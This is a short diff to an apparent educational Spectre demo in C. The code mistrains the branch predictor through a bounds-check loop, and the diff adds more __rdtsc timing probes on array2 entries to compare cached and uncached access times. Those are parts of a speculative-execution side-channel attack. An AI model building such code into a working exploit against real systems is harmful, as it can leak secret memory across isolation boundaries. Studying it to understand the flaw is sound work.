@@ -59,11 +59,9 @@ int main (int argc, char *argv[]){
 
 
     // mistrain execution predictor 4 times 
-    int index_counter = 0;
     for (int x = 1; x < 20; x+=x){
         if ((is_in_boundary(x)) == 1){ /// Spectre Attak
             printf("Value at array1[%d] is %d\n",x, array1[x]);
-            index_counter ++;
         }
     }
 
@@ -81,5 +79,13 @@ int main (int argc, char *argv[]){
     time1 = __rdtsc();
     junk = array2[1];
     time2 = __rdtsc();
-    printf("It takes CPU %ld cycles to find value of array1[1] which should be NOT in cache (placebo).\n", (long) time2-time1);
+    printf("It takes CPU %ld cycles to find value of array2[1] which should be NOT in cache (placebo).\n", (long) time2-time1);
+    time1 = __rdtsc();
+    junk = array2[2];
+    time2 = __rdtsc();
+    printf("It takes CPU %ld cycles to find value of array2[2] which should be NOT in cache (placebo).\n", (long) time2-time1);
+    time1 = __rdtsc();
+    junk = array2[3];
+    time2 = __rdtsc();
+    printf("It takes CPU %ld cycles to find value of array2[3] which should be NOT in cache (placebo).\n", (long) time2-time1);
 }
